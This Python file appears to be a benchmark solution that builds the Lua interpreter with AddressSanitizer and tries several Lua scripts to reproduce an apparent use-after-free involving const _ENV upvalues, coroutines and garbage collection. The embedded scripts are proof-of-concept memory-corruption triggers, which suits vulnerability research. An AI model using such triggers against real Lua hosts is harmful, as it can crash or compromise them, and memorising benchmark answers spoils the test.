import os
import re
import tarfile
import tempfile
import subprocess
from pathlib import Path
from typing import List, Optional, Tuple


class Solution:
    def _extract_src(self, src_path: str) -> str:
        p = Path(src_path)
        if p.is_dir():
            return str(p.resolve())
        tmpdir = tempfile.mkdtemp(prefix="src_")
        try:
            with tarfile.open(str(p), "r:*") as tf:
                tf.extractall(tmpdir)
        except Exception:
            return tmpdir
        return tmpdir

    def _find_lua_src_dir(self, root: str) -> Optional[str]:
        rootp = Path(root)
        candidates = []
        for dirpath, dirnames, filenames in os.walk(root):
            fnset = set(filenames)
            if "lua.c" in fnset and "lapi.c" in fnset and "lstate.c" in fnset:
                candidates.append(dirpath)
        if candidates:
            candidates.sort(key=lambda d: (len(Path(d).parts), d))
            return candidates[0]
        for dirpath, dirnames, filenames in os.walk(root):
            fnset = set(filenames)
            if "lapi.c" in fnset and "lstate.c" in fnset:
                candidates.append(dirpath)
        if candidates:
            candidates.sort(key=lambda d: (len(Path(d).parts), d))
            return candidates[0]
        return None

    def _c_files(self, srcdir: str) -> List[str]:
        cfiles = []
        for p in Path(srcdir).glob("*.c"):
            name = p.name.lower()
            if name in ("luac.c", "onelua.c", "ltests.c"):
                continue
            cfiles.append(str(p))
        cfiles.sort()
        return cfiles

    def _file_has_main(self, path: str) -> bool:
        try:
            with open(path, "rb") as f:
                data = f.read(30000)
        except Exception:
            return False
        return re.search(rb"\bmain\s*\(", data) is not None

    def _build_lua_asan(self, srcdir: str) -> Optional[str]:
        cfiles = self._c_files(srcdir)
        if not cfiles:
            return None

        main_files = [f for f in cfiles if self._file_has_main(f)]
        preferred = None
        for f in main_files:
            if Path(f).name == "lua.c":
                preferred = f
                break
        if preferred is None and main_files:
            preferred = main_files[0]

        if preferred is None:
            return None

        # Exclude other main files to avoid duplicate symbols
        filtered = []
        for f in cfiles:
            if f != preferred and self._file_has_main(f):
                continue
            filtered.append(f)

        outdir = tempfile.mkdtemp(prefix="build_")
        outbin = str(Path(outdir) / "lua_asan")

        cc = os.environ.get("CC", "gcc")
        cmd = [
            cc,
            "-std=c99",
            "-O0",
            "-g",
            "-fno-omit-frame-pointer",
            "-fsanitize=address",
            "-Isrc",
            "-DLUA_USE_LINUX",
            "-DLUA_COMPAT_5_3",
            "-o",
            outbin,
        ] + filtered + ["-lm", "-ldl"]

        try:
            subprocess.run(
                cmd,
                cwd=str(Path(srcdir).parent),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=120,
                check=True,
            )
            return outbin
        except Exception:
            return None

    def _run_lua(self, lua_bin: str, script: bytes) -> Tuple[int, bytes, bytes]:
        with tempfile.NamedTemporaryFile(prefix="poc_", suffix=".lua", delete=False) as tf:
            tf.write(script)
            tf.flush()
            spath = tf.name
        try:
            env = dict(os.environ)
            env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "") + (":" if env.get("ASAN_OPTIONS") else "") + "detect_leaks=0:abort_on_error=1"
            p = subprocess.run(
                [lua_bin, spath],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=10,
                env=env,
            )
            return p.returncode, p.stdout, p.stderr
        finally:
            try:
                os.unlink(spath)
            except Exception:
                pass

    def _is_asan_crash(self, rc: int, err: bytes) -> bool:
        if rc == 0:
            return False
        e = err.lower()
        if b"addresssanitizer" in e:
            return True
        if b"heap-use-after-free" in e or b"use-after-free" in e:
            return True
        if b"asan" in e and (b"error:" in e or b"fatal" in e):
            return True
        return False

    def _candidates(self) -> List[bytes]:
        c0 = (
            b'local co=coroutine.create(function()\n'
            b'  local _ENV <const> = _ENV\n'
            b'  return function()\n'
            b'    return _ENV, print\n'
            b'  end\n'
            b'end)\n'
            b'local _,f=coroutine.resume(co)\n'
            b'co=nil\n'
            b'for i=1,6 do collectgarbage("collect") end\n'
            b'local e,p=f()\n'
            b'p("ok")\n'
        )
        c1 = (
            b'local function make()\n'
            b'  local _ENV <const> = _ENV\n'
            b'  return function()\n'
            b'    return type(print), _ENV\n'
            b'  end\n'
            b'end\n'
            b'local co=coroutine.create(function() return make() end)\n'
            b'local _,f=coroutine.resume(co)\n'
            b'co=nil\n'
            b'for i=1,10 do collectgarbage("collect") end\n'
            b'local t,e=f()\n'
            b'if t=="function" then print("ok") end\n'
        )
        c2 = (
            b'local function make()\n'
            b'  local _ENV <const> = setmetatable({}, {__index=_G})\n'
            b'  return function()\n'
            b'    local x=_ENV\n'
            b'    return tostring(print), x\n'
            b'  end\n'
            b'end\n'
            b'local co=coroutine.create(function() return make() end)\n'
            b'local _,f=coroutine.resume(co)\n'
            b'co=nil\n'
            b'for i=1,10 do collectgarbage("collect") end\n'
            b'local s,x=f()\n'
            b'print("ok")\n'
        )
        c3 = (
            b'local function maker()\n'
            b'  local _ENV <const> = _ENV\n'
            b'  local function inner()\n'
            b'    local a=_ENV\n'
            b'    return a, print, tostring(123)\n'
            b'  end\n'
            b'  return inner\n'
            b'end\n'
            b'local co=coroutine.create(function() return maker() end)\n'
            b'local _,f=coroutine.resume(co)\n'
            b'co=nil\n'
            b'for i=1,12 do collectgarbage("collect") end\n'
            b'local a,p,s=f()\n'
            b'p("ok")\n'
        )
        return [c0, c1, c2, c3]

    def solve(self, src_path: str) -> bytes:
        fallback = self._candidates()[0]

        root = self._extract_src(src_path)
        srcdir = self._find_lua_src_dir(root)
        if not srcdir:
            return fallback

        lua_bin = self._build_lua_asan(srcdir)
        if not lua_bin:
            return fallback

        crashing = []
        for c in self._candidates():
            try:
                rc, out, err = self._run_lua(lua_bin, c)
            except Exception:
                continue
            if self._is_asan_crash(rc, err):
                crashing.append(c)

        if crashing:
            crashing.sort(key=len)
            return crashing[0]

        return fallback